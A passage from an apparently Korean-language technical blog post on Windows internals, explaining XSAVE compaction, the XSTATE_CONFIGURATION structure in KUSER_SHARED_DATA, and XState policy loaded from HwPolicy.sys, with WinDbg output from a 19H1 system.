&#xC694;&#xCCAD;&#xB41C; &#xC0C1;&#xD0DC; &#xBE44;&#xD2B8; &#xC911; &#xC5B4;&#xB290; &#xAC83;&#xC774; &#xBE44;&#xAD50; &#xC601;&#xC5ED;&#xC5D0; &#xC788;&#xC744; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xB098;&#xD0C0;&#xB0B8;&#xB2E4;. <code>XSTATE_BV</code>&#xC640; &#xB2EC;&#xB9AC; &#xC774; &#xB9C8;&#xC2A4;&#xD06C;&#xB294; <code>XINUSE</code>&#xC758; &#xC77C;&#xBD80;&#xAC00; &#xC544;&#xB2CC; &#xC0C1;&#xD0DC; &#xBE44;&#xD2B8;&#xB97C; &#xC0DD;&#xB7B5;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xC555;&#xCD95;&#xB420; &#xC218; &#xC788;&#xB294; &#xBAA8;&#xB4E0; &#xAC00;&#xB2A5;&#xD55C; &#xBE44;&#xD2B8;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xBBC0;&#xB85C; <code>XSTATE_BV</code>&#xB97C; &#xD1B5;&#xD574; &#xC2E4;&#xC81C;&#xB85C; &#xC5B4;&#xB5A4; &#xC0C1;&#xD0DC; &#xC601;&#xC5ED;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C;, &#xC555;&#xCD95;&#xB41C; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC0AC;&#xC6A9;&#xB420; &#xB54C; &#xBE44;&#xD2B8; 63&#xC740; &#xD56D;&#xC0C1; <code>XCOMP_BV</code>&#xC5D0;&#xC11C; XSAVE &#xC601;&#xC5ED;&#xC5D0; &#xB300;&#xD55C; &#xC9C0;&#xC2DC;&#xC790;&#xB85C; &#xC124;&#xC815;&#xB41C;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xC555;&#xCD95;&#xB41C; &#xD3EC;&#xB9F7;&#xC778;&#xC9C0;&#xC5D0; &#xB530;&#xB77C; XSAVE &#xC601;&#xC5ED;&#xC758; &#xB0B4;&#xBD80; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xACFC; &#xD06C;&#xAE30;&#xAC00; &#xACB0;&#xC815;&#xB41C;&#xB2E4;. &#xC555;&#xCD95;&#xB41C; &#xD3EC;&#xB9F7;&#xC740; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xAE30;&#xB2A5;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB9CC; XSAVE &#xC601;&#xC5ED;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0;, &#xC555;&#xCD95;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD3EC;&#xB9F7;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xAC00; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xAE30;&#xB2A5;&#xC5D0; &#xB300;&#xD574; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xB9CC; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. &#xC544;&#xB798; &#xB2E4;&#xC774;&#xC5B4;&#xADF8;&#xB7A8;&#xC740; &#xB3D9;&#xC77C;&#xD55C; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0; &#xB300;&#xD574; XSAVE &#xC601;&#xC5ED;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xBCF4;&#xC774;&#xB294;&#xC9C0;, &#xAC01;&#xAC01;&#xC758; &#xD3EC;&#xB9F7;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xB54C;&#xC758; &#xC608;&#xB97C; &#xBCF4;&#xC5EC;&#xC900;&#xB2E4;.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/2.png" alt></p><blockquote><p>Compacted XSAVE vs not Compacted XSAVE AVX &#xBC0F; CET_U&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC2A4;&#xB808;&#xB4DC;, &#xC774;&#xB7EC;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB428;</p></blockquote><p>&#xC694;&#xC57D;&#xD558;&#xC790;&#xBA74;,  <code>XSAVE</code>&#xC640; <code>XRSTOR</code> &#xBA85;&#xB839;&#xC5B4; &#xC9D1;&#xD569;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC870;&#xD569;&#xACFC; &#xD568;&#xAED8; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;.</p><ol><li>OS&#xAC00; XCR0&#xC744; &#xC9C0;&#xC6D0;&#xD560; &#xB54C; &#xC124;&#xC815;&#xB418;&#xB294; &#xC0C1;&#xD0DC; &#xBE44;&#xD2B8; (<code>XSETBV</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC124;&#xC815;)</li><li><code>XSAVE</code> &#xBA85;&#xB839;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xD638;&#xCD9C;&#xC790;&#xAC00; EDX : EAX&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xC0C1;&#xD0DC; &#xBE44;&#xD2B8; (&#xC778;&#xD154;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB97C; <code>instruction mask</code>&#xB77C;&#xACE0; &#xD568;)</li><li>&#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0; <code>IA32_XSS</code>&#xC5D0; &#xC124;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC; &#xBE44;&#xD2B8;</li><li><code>XINUSE</code>&#xC5D0; &#xC124;&#xC815;&#xB41C; &#xC0C1;&#xD0DC; &#xBE44;&#xD2B8;&#xC778; <code>&#xCD5C;&#xC801;&#xD654;&#xB41C; XSAVE</code>&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC5D0;&#xC11C; &#xB9C8;&#xC9C0;&#xB9C9; &#xC804;&#xD658; &#xC774;&#xD6C4; &#xD604;&#xC7AC; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB41C; &#xC2E4;&#xC81C; XState &#xAD00;&#xB828; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xCD94;&#xC801;&#xD558;&#xB294; &#xB0B4;&#xBD80; &#xB808;&#xC9C0;&#xC2A4;&#xD130;</li></ol><p>&#xC774;&#xB7EC;&#xD55C; &#xBE44;&#xD2B8;&#xAC00; &#xD568;&#xAED8; &#xB9C8;&#xC2A4;&#xD0B9;&#xB418;&#xBA74; <code>XSAVE</code> &#xBA85;&#xB839;&#xC5D0; &#xC758;&#xD574; <code>XSTATE_BV</code> &#xD544;&#xB4DC;&#xC758; XSAVE &#xC601;&#xC5ED;&#xC758; &#xD5E4;&#xB354;&#xC5D0; &#xCD5C;&#xC885; &#xC0C1;&#xD0DC; &#xBE44;&#xD2B8;&#xAC00; &#xAE30;&#xB85D;&#xB41C;&#xB2E4;. <code>Compacted XSAVE</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0; <code>XINUSE</code>&#xB97C; &#xC0DD;&#xB7B5;&#xD55C; &#xACB0;&#xACFC; &#xC0C1;&#xD0DC; &#xBE44;&#xD2B8;&#xAC00;  <code>XCOMP_BV</code> &#xD544;&#xB4DC;&#xC5D0; XSAVE &#xC601;&#xC5ED;&#xC758; &#xD5E4;&#xB354;&#xC5D0; &#xAE30;&#xB85D;&#xB41C;&#xB2E4;. &#xC544;&#xB798; &#xB2E4;&#xC774;&#xC5B4;&#xADF8;&#xB7A8;&#xC740; &#xACB0;&#xACFC; &#xB9C8;&#xC2A4;&#xD06C;&#xB97C; &#xBCF4;&#xC5EC;&#xC900;&#xB2E4;.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/3.png" alt></p><h2 id="XState-&#xAD6C;&#xC131;"><a href="#XState-&#xAD6C;&#xC131;" class="headerlink" title="XState &#xAD6C;&#xC131;"></a>XState &#xAD6C;&#xC131;</h2><p>&#xAC01; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC5D0;&#xB294; &#xC790;&#xCCB4;&#xC801;&#xC778; XState &#xD65C;&#xC131;&#xD654; &#xAE30;&#xB2A5;, &#xC608;&#xC0C1;&#xB418;&#xB294; &#xD06C;&#xAE30;, &#xAE30;&#xB2A5; &#xBC0F; &#xBA54;&#xCEE4;&#xB2C8;&#xC998; &#xC138;&#xD2B8;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC5B4; Intel&#xC740; &#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xAC00; XState&#xB97C; &#xCC98;&#xB9AC;&#xD560; &#xB54C; &#xCFFC;&#xB9AC; &#xD574;&#xC57C; &#xD558;&#xB294; &#xB2E4;&#xC591;&#xD55C; CPUID &#xD074;&#xB798;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; &#xC815;&#xBCF4;&#xB97C; &#xB178;&#xCD9C;&#xD55C;&#xB2E4;. Windows&#xB294; &#xBD80;&#xD305; &#xC2DC; &#xC774;&#xB7EC;&#xD55C; &#xCFFC;&#xB9AC;&#xB97C; &#xC218;&#xD589;&#xD558;&#xACE0; <code>XSTATE_CONFIGURATION</code> &#xC544;&#xB798;&#xC5D0; &#xD45C;&#xC2DC;&#xB41C; &#xAD6C;&#xC870;&#xC5D0; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;. (Winnt.h&#xC5D0; &#xBB38;&#xC11C;&#xD654;&#xB428;)</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">XSTATE_CONFIGURATION</span></span><span class="hljs-class">{</span>    ULONG64 EnabledFeatures;    ULONG64 EnabledVolatileFeatures;    ULONG Size;    <span class="hljs-keyword">union</span>    {        ULONG ControlFlags;        <span class="hljs-class"><span class="hljs-keyword">struct</span></span><span class="hljs-class">        {</span>            ULONG OptimizedSave:<span class="hljs-number">1</span>;            ULONG CompactionEnabled:<span class="hljs-number">1</span>;        };    };    XSTATE_FEATURE Features[MAXIMUM_XSTATE_FEATURES];    ULONG64 EnabledSupervisorFeatures;    ULONG64 AlignedFeatures;    ULONG AllFeatureSize;    ULONG AllFeatures[MAXIMUM_XSTATE_FEATURES];    ULONG64 EnabledUserVisibleSupervisorFeatures;} XSTATE_CONFIGURATION, *PXSTATE_CONFIGURATION;</code></pre><p>&#xC774; &#xB370;&#xC774;&#xD130;&#xB4E4;&#xC744; &#xBCF4;&#xAD00;&#xD55C; &#xD6C4; &#xCEE4;&#xB110;&#xC740; <code>KUSER_SHARED_DATA</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;. &#xC774; &#xAD6C;&#xC870;&#xCCB4;&#xB294; <code>SharedUserData</code> &#xBCC0;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC561;&#xC138;&#xC2A4; &#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xBAA8;&#xB4E0; Windows &#xD50C;&#xB7AB;&#xD3FC;&#xC758; <code>0x7FFE0000</code> &#xC8FC;&#xC18C;&#xC5D0; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;.</p><p>Optimized, Compacted XSAVE&#xB97C; &#xBAA8;&#xB450; &#xC9C0;&#xC6D0;&#xD558;&#xACE0; x87 FPU(0), SSE(1), AVX(2) &#xBC0F; MPX(3, 4) &#xAE30;&#xB2A5; &#xBE44;&#xD2B8;&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xD14C;&#xC2A4;&#xD2B8; <code>19H1</code> &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xCD9C;&#xB825;&#xC744; &#xC608;&#xB85C; &#xB4E4; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs c">dx ((nt!_KUSER_SHARED_DATA*)<span class="hljs-number">0x7ffe0000</span>)-&gt;XState    [+<span class="hljs-number">0x000</span>] EnabledFeatures  : <span class="hljs-number">0x1f</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]    [+<span class="hljs-number">0x008</span>] EnabledVolatileFeatures : <span class="hljs-number">0xf</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]    [+<span class="hljs-number">0x010</span>] Size             : <span class="hljs-number">0x3c0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x014</span>] ControlFlags     : <span class="hljs-number">0x3</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x014</span> ( <span class="hljs-number">0</span>: <span class="hljs-number">0</span>)] OptimizedSave    : <span class="hljs-number">0x1</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x014</span> ( <span class="hljs-number">1</span>: <span class="hljs-number">1</span>)] CompactionEnabled : <span class="hljs-number">0x1</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x018</span>] Features         [Type: _XSTATE_FEATURE [<span class="hljs-number">64</span>]]    [+<span class="hljs-number">0x218</span>] EnabledSupervisorFeatures : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]    [+<span class="hljs-number">0x220</span>] AlignedFeatures  : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]    [+<span class="hljs-number">0x228</span>] AllFeatureSize   : <span class="hljs-number">0x3c0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x22c</span>] AllFeatures      [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> [<span class="hljs-number">64</span>]]    [+<span class="hljs-number">0x330</span>] EnabledUserVisibleSupervisorFeatures : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]</code></pre><p>Features &#xBC30;&#xC5F4;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C; 5&#xAC00;&#xC9C0; &#xAE30;&#xB2A5;&#xC758; &#xD06C;&#xAE30;&#xC640; &#xC624;&#xD504;&#xC14B;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs c">dx -r2 (((nt!_KUSER_SHARED_DATA*)<span class="hljs-number">0x7ffe0000</span>)-&gt;XState)-&gt;Features.Take(<span class="hljs-number">5</span>)    [<span class="hljs-number">0</span>]              [Type: _XSTATE_FEATURE]        [+<span class="hljs-number">0x000</span>] Offset           : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]        [+<span class="hljs-number">0x004</span>] Size             : <span class="hljs-number">0xa0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [<span class="hljs-number">1</span>]              [Type: _XSTATE_FEATURE]        [+<span class="hljs-number">0x000</span>] Offset           : <span class="hljs-number">0xa0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]        [+<span class="hljs-number">0x004</span>] Size             : <span class="hljs-number">0x100</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [<span class="hljs-number">2</span>]              [Type: _XSTATE_FEATURE]        [+<span class="hljs-number">0x000</span>] Offset           : <span class="hljs-number">0x240</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]        [+<span class="hljs-number">0x004</span>] Size             : <span class="hljs-number">0x100</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [<span class="hljs-number">3</span>]              [Type: _XSTATE_FEATURE]        [+<span class="hljs-number">0x000</span>] Offset           : <span class="hljs-number">0x340</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]        [+<span class="hljs-number">0x004</span>] Size             : <span class="hljs-number">0x40</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [<span class="hljs-number">4</span>]              [Type: _XSTATE_FEATURE]        [+<span class="hljs-number">0x000</span>] Offset           : <span class="hljs-number">0x380</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]        [+<span class="hljs-number">0x004</span>] Size             : <span class="hljs-number">0x40</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]</code></pre><p>&#xC774; &#xD06C;&#xAE30;&#xB97C; &#xD569;&#xD558;&#xBA74; &#xC704;&#xC758; <code>FeatureSize</code> &#xD544;&#xB4DC;&#xC5D0; &#xD45C;&#xC2DC;&#xB41C; &#xAC12;&#xC778; <code>0x3C0</code>&#xC774; &#xB41C;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC774; &#xC2DC;&#xC2A4;&#xD15C;&#xC740; <code>Compacted XSAVE</code> &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xBBC0;&#xB85C; &#xC5EC;&#xAE30;&#xC5D0; &#xD45C;&#xC2DC;&#xB41C; &#xC624;&#xD504;&#xC14B;&#xC740; &#xAD00;&#xB828;&#xC774; &#xC5C6;&#xC73C;&#xBA70; &#xBAA8;&#xB4E0; &#xAE30;&#xB2A5;&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xC9C0;&#xB9CC; &#xC624;&#xD504;&#xC14B;&#xC740; &#xD3EC;&#xD568;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xCEE4;&#xB110;&#xC5D0;&#xB9CC; &#xC720;&#xC6A9;&#xD558;&#xAC8C; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;.(<code>XCOMP_BV</code>&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC555;&#xCD95; &#xB9C8;&#xC2A4;&#xD06C;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xACB0;&#xC815;&#xB418;&#xAE30; &#xB54C;&#xBB38;)</p><h2 id="XState-&#xC815;&#xCC45;"><a href="#XState-&#xC815;&#xCC45;" class="headerlink" title="XState &#xC815;&#xCC45;"></a>XState &#xC815;&#xCC45;</h2><p>&#xD504;&#xB85C;&#xC138;&#xC11C;&#xAC00; XState&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0;&#xB9CC; &#xB2E4;&#xC591;&#xD55C; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xC624;&#xB958; &#xB54C;&#xBB38;&#xC5D0; &#xD2B9;&#xC815; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xAC00; &#xC774; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xB300;&#xB85C; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xC885;&#xC885; &#xBC1C;&#xC0DD;&#xD55C;&#xB2E4;. &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; Windows&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C;  &#xB77C;&#xACE0; &#xD558;&#xB294; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xC815;&#xCC45; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC778; <code>HwPolicy.sys</code> &#xC758; &#xB9AC;&#xC18C;&#xC2A4; &#xC139;&#xC158;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; XState &#xC815;&#xCC45;&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;.</p><p>Intel x86 &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB294; &#xC5EC;&#xB7EC; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xBCA4;&#xB354; &#xC911; &#xD558;&#xB098;&#xC774;&#xBBC0;&#xB85C; &#xCEE4;&#xB110;&#xC740; XState &#xC815;&#xCC45;&#xC744; &#xAD6C;&#xBB38; &#xBD84;&#xC11D;&#xD558;&#xACE0; &#xD604;&#xC7AC; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC758; &#xBCA4;&#xB354; &#xBB38;&#xC790;&#xC5F4; &#xBC0F; &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xCF54;&#xB4DC; &#xBC84;&#xC804;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;, &#xAE30;&#xB2A5; &#xBC0F; &#xD655;&#xC7A5; &#xAE30;&#xB2A5;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xACE0; (&#xC989;, CPUID 01h &#xCFFC;&#xB9AC;&#xC758; RAX, RDX &#xBC0F; RCX), &#xC815;&#xCC45;&#xC5D0;&#xC11C; &#xC77C;&#xCE58;&#xD558;&#xB294; &#xD56D;&#xBAA9;&#xC744; &#xCC3E;&#xB294;&#xB2E4;.</p><p>&#xC774; &#xC791;&#xC5C5;&#xC740; &#xBD80;&#xD305; &#xC2DC;&#xC5D0; <code>KiInitializeXSave</code>&#xAC00; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>KiIntersectFeaturesWithPolicy</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xB41C;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xB294; <code>KiLoadPolicyFromImage</code> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC801;&#xC808;&#xD55C; XState &#xC815;&#xCC45;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xACE0; <code>KiGetProcessorInformation</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xC5EC; CPU&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAC00;&#xC838;&#xC628; &#xB2E4;&#xC74C; XState &#xAD6C;&#xC131;&#xC5D0;&#xC11C; &#xD604;&#xC7AC; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xAC01; &#xAE30;&#xB2A5; &#xBE44;&#xD2B8;&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; <code>KiIsXSaveFeatureAllowed</code> &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD55C;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; &#xAE30;&#xB2A5;&#xC740; <code>HwPolicy.sys</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; &#xB9AC;&#xC18C;&#xC2A4; 101&#xC5D0;&#xC11C; &#xC791;&#xB3D9;&#xD558;&#xBA70; &#xAD6C;&#xC870;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">XSAVE_POLICY</span></span><span class="hljs-class">{</span>    ULONG Version;    ULONG Size;    ULONG Flags;    ULONG MaxSaveAreaLength;    ULONGLONG FeatureBitmask;    ULONG NumberOfFeatures;    XSAVE_FEATURE Features[<span class="hljs-number">1</span>];} XSAVE_POLICY, *PXSAVE_POLICY;</code></pre><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;,  <code>19H1</code> &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xB9AC;&#xC18C;&#xC2A4; &#xD574;&#xCEE4;&#xB85C; &#xCD94;&#xCD9C;&#xD55C; &#xB0B4;&#xC6A9;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><pre><code class="hljs c">dx @$policy = (_XSAVE_POLICY*)<span class="hljs-number">0x253d0e90000</span>[+<span class="hljs-number">0x000</span>] Version       : <span class="hljs-number">0x3</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x004</span>] Size          : <span class="hljs-number">0x2fd8</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x008</span>] Flags         : <span class="hljs-number">0x9</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x00c</span>] MaxSaveAreaLength : <span class="hljs-number">0x2000</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x010</span>] FeatureBitmask   : <span class="hljs-number">0x7fffffffffffffff</span> [Type: <span class="hljs-keyword">unsigned</span> __int64][+<span class="hljs-number">0x018</span>] NumberOfFeatures : <span class="hljs-number">0x3f</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x020</span>] Features      [Type: _XSAVE_FEATURE [<span class="hljs-number">1</span>]]</code></pre><p>&#xAC01; <code>XSAVE_FEATURE</code>&#xC5D0; &#xB300;&#xD574; &#xAC01;&#xAC01; CPU &#xACF5;&#xAE09; &#xC5C5;&#xCCB4; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC788;&#xB294; <code>XSAVE_VENDOR</code> &#xAD6C;&#xC870;&#xC758; &#xBC30;&#xC5F4;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xB294; <code>XSAVE_VENDORS</code> &#xAD6C;&#xC870;&#xC5D0; &#xB300;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xACFC; (&#xC9C0;&#xAE08;&#xC740; &#xAC01;&#xAC01; &#x201C;GenuineIntel&#x201D;, &#x201C;AuthenticAMD&#x201D; &#xB610;&#xB294; &#x201C;CentaurHauls&#x201D;) <code>XSAVE_CPU_ERRATA</code> &#xAD6C;&#xC870;&#xC5D0; &#xB300;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, <code>19H1</code> &#xD14C;&#xC2A4;&#xD2B8; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xB294; &#xAE30;&#xB2A5; 0&#xC5D0; &#xB300;&#xD55C; &#xB2E4;&#xC74C; &#xC815;&#xBCF4;&#xAC00; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;.</p><pre><code class="hljs c">dx -r4 @$vendor = (XSAVE_VENDORS*)((<span class="hljs-keyword">int</span>)@$policy-&gt;Features[<span class="hljs-number">0</span>].Vendors + <span class="hljs-number">0x253d0e90000</span>)[+<span class="hljs-number">0x000</span>] NumberOfVendors  : <span class="hljs-number">0x3</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x008</span>] Vendor        [Type: _XSAVE_VENDOR [<span class="hljs-number">1</span>]]    [<span class="hljs-number">0</span>]           [Type: _XSAVE_VENDOR]        [+<span class="hljs-number">0x000</span>] VendorId      [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> [<span class="hljs-number">3</span>]]            [<span class="hljs-number">0</span>]           : <span class="hljs-number">0x756e6547</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]            [<span class="hljs-number">1</span>]           : <span class="hljs-number">0x49656e69</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]            [<span class="hljs-number">2</span>]           : <span class="hljs-number">0x6c65746e</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x010</span>] SupportedCpu  [Type: _XSAVE_SUPPORTED_CPU][+<span class="hljs-number">0x000</span>] CpuInfo       [Type: XSAVE_CPU_INFO][+<span class="hljs-number">0x020</span>] CpuErrata     : <span class="hljs-number">0x4c0</span> [Type: XSAVE_CPU_ERRATA *][+<span class="hljs-number">0x020</span>] Unused        : <span class="hljs-number">0x4c0</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]</code></pre><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C;, &#xAC01; <code>XSAVE_CPU_ERRATA</code> &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xC9C0;&#xC815;&#xB41C; XState &#xC9C0;&#xC6D0;&#xC5D0; &#xB300;&#xD55C; &#xC624;&#xB958; &#xC815;&#xBCF4;&#xC640; &#xC77C;&#xCE58;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xC815;&#xBCF4; &#xB370;&#xC774;&#xD130;&#xB97C; 